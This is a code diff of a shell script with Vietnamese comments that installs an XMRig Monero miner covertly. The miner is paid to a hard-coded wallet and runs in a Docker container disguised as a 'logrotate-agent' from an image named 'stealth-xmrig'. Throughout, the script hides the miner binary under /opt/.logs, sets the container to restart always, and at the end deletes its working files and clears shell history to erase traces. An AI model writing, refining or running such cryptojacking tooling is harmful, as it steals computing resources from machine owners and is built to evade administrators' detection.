@@ -3,91 +3,83 @@
 # ========== KIỂM TRA PHỤ THUỘC ========== 
 command -v docker >/dev/null || { echo "❌ Docker chưa cài."; exit 1; }
 command -v curl >/dev/null || { echo "❌ curl chưa cài."; exit 1; }
-command -v bc >/dev/null || { echo "❌ bc chưa cài."; sudo apt-get install -y bc; }
+command -v bc >/dev/null || { echo "❌ bc chưa cài. Cài đặt bc..."; sudo apt-get update && sudo apt-get install -y bc; }
 
 # ========== CẤU HÌNH ========== 
-WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz} 
-CONTAINER_NAME=${CONTAINER_NAME:-logrotate-agent} 
-IMAGE_NAME=${IMAGE_NAME:-stealth-xmrig} 
+WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz}
+CONTAINER_NAME=${CONTAINER_NAME:-logrotate-agent}
+IMAGE_NAME=${IMAGE_NAME:-stealth-xmrig}
 
 # ========== LẤY SỐ CORE CPU VÀ TÍNH THREAD_HINT ========== 
-CPU_CORES=$(nproc)  # Lấy số lượng core CPU 
-THREAD_HINT=$(echo "$CPU_CORES * 0.8" | bc)  # Tính 80% số core (có thể thay đổi tỷ lệ này)
+CPU_CORES=$(nproc)                               # Số core vật lý/logical
+THREAD_HINT=$(echo "$CPU_CORES * 0.8" | bc)      # Sử dụng 80% số core
 
-XMRIG_ZIP_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" 
-EXPECTED_SHA256="1d903d39c7e4e1706c32c44721d6a6c851aa8c4c10df1479478ee93cd67301bc"  # SHA256 chính xác của file tải về
+# ========== CÀI ĐẶT URL VÀ HASH CHO BẢN XMRIG LINUX ========== 
+XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
+EXPECTED_SHA256="e7db269f47ea6f95801b1d2975c9285a3ff22fc3045c5f503b6cb316091160ec"
 
 # ========== DỌN DẸP CŨ ========== 
 docker rm -f "$CONTAINER_NAME" 2>/dev/null
 
-# ========== UNMASK DỊCH VỤ CẦN THIẾT ========== 
+# ========== UNMASK + KHỞI ĐỘNG DOCKER ========== 
 sudo systemctl unmask docker
 sudo systemctl unmask docker.socket
 sudo systemctl unmask containerd.service
 
-sudo systemctl start docker
-sudo systemctl start docker.socket
-sudo systemctl start containerd.service
-
-
-# Kiểm tra xem Docker daemon có đang chạy không
 if ! sudo systemctl is-active --quiet docker; then
-    echo "❌ Docker daemon không chạy. Khởi động Docker..."
-    sudo systemctl start docker || { echo "❌ Không thể khởi động Docker."; exit 1; }
+  echo "❌ Docker daemon chưa chạy. Khởi động Docker..."
+  sudo systemctl start docker || { echo "❌ Không thể khởi động Docker."; exit 1; }
 fi
 
 # ========== TẠO THƯ MỤC TẠM ========== 
-WORKDIR=$(mktemp -d) 
+WORKDIR=$(mktemp -d)
 cd "$WORKDIR" || exit 1
 
-# ========== TẢI VÀ KIỂM TRA ========== 
-echo "[*] Tải XMRig..." 
-curl -L -o xmrig.zip "$XMRIG_ZIP_URL"
+# ========== TẢI VÀ KIỂM TRA HASH ========== 
+echo "[*] Tải XMRig Linux..."
+curl -L -o xmrig.tar.gz "$XMRIG_URL"
 
-# Kiểm tra hash SHA256 của file tải về 
-ACTUAL_SHA256=$(sha256sum xmrig.zip | awk '{ print $1 }') 
-if [ "$ACTUAL_SHA256" != "$EXPECTED_SHA256" ]; then 
-  echo "❌ Hash không khớp. Đã tải file bị sửa đổi." 
-  exit 1 
-fi 
-echo "[✓] Kiểm tra hash thành công."
+ACTUAL_SHA256=$(sha256sum xmrig.tar.gz | awk '{ print $1 }')
+if [ "$ACTUAL_SHA256" != "$EXPECTED_SHA256" ]; then
+  echo "❌ Hash không khớp. File tải về bị thay đổi."
+  exit 1
+fi
+echo "[✓] Hash kiểm tra thành công."
 
-unzip xmrig.zip >/dev/null 2>&1 
+# ========== GIẢI NÉN VÀ DI CHUYỂN BINARY ========== 
+tar -xf xmrig.tar.gz
 
-# Kiểm tra cấu trúc thư mục sau khi giải nén
-echo "[*] Kiểm tra cấu trúc thư mục sau khi giải nén:"
-ls -l
-
-# Sửa lại để tìm chính xác file xmrig
-if [ ! -f xmrig ]; then
-    echo "❌ Không tìm thấy tệp xmrig sau khi giải nén."
-    exit 1
+# Kiểm tra xem binary tồn tại
+XMRIG_BIN_PATH=$(find . -type f -name xmrig | head -n1)
+if [ -z "$XMRIG_BIN_PATH" ]; then
+  echo "❌ Không tìm thấy binary xmrig sau khi giải nén."
+  exit 1
 fi
 
-# Di chuyển tệp xmrig vào thư mục hiện tại
-mv xmrig*/xmrig .
+mv "$XMRIG_BIN_PATH" ./xmrig
+chmod +x ./xmrig
 
-# ========== TẠO CONFIG ========== 
-cat > config.json <<EOF 
-{ 
-  "autosave": true, 
-  "cpu": { 
-    "enabled": true, 
-    "max-threads-hint": $THREAD_HINT,  # Sử dụng số luồng tính toán từ CPU_CORES
-    "priority": 0 
-  }, 
-  "pools": [ 
-    { 
-      "url": "supportxmr.com:443", 
-      "user": "$WALLET", 
-      "tls": true 
-    } 
-  ] 
+# ========== TẠO FILE CẤU HÌNH ========== 
+cat > config.json <<EOF
+{
+  "autosave": true,
+  "cpu": {
+    "enabled": true,
+    "max-threads-hint": $THREAD_HINT,
+    "priority": 0
+  },
+  "pools": [
+    {
+      "url": "supportxmr.com:443",
+      "user": "$WALLET",
+      "tls": true
+    }
+  ]
 }
 EOF
 
-# ========== Dockerfile ========== 
-cat > Dockerfile <<EOF 
+# ========== TẠO Dockerfile ========== 
+cat > Dockerfile <<EOF
 FROM ubuntu:20.04
 
 RUN apt-get update && \
@@ -103,22 +95,22 @@ RUN chmod 700 /opt/.logs/log-agent && chmod 600 /opt/.logs/config.json
 ENTRYPOINT ["/opt/.logs/log-agent", "--config=/opt/.logs/config.json"]
 EOF
 
-# ========== BUILD ========== 
-echo "[*] Build Docker image..." 
+# ========== BUILD DOCKER IMAGE ========== 
+echo "[*] Build Docker image..."
 docker build -t "$IMAGE_NAME" . || { echo "❌ Build thất bại"; exit 1; }
 
-# ========== RUN ========== 
-echo "[*] Chạy container '$CONTAINER_NAME'..." 
+# ========== RUN CONTAINER ========== 
+echo "[*] Chạy container '$CONTAINER_NAME'..."
 docker run -d --name "$CONTAINER_NAME" \
-  --cpus="0.8" --memory="20000m" \  # Điều chỉnh phần này nếu cần
+  --cpus="0.8" --memory="20000m" \
   --restart=always \
   --detach \
   --log-driver=syslog \
   "$IMAGE_NAME"
 
-# ========== XOÁ DẤU VẾT ========== 
-cd ~ 
-rm -rf "$WORKDIR" 
+# ========== DỌN DẸP VÀ XOÁ DẤU VẾT ========== 
+cd ~
+rm -rf "$WORKDIR"
 history -c && history -w
 
 echo "[✓] Hoàn tất. Container '$CONTAINER_NAME' đang chạy."
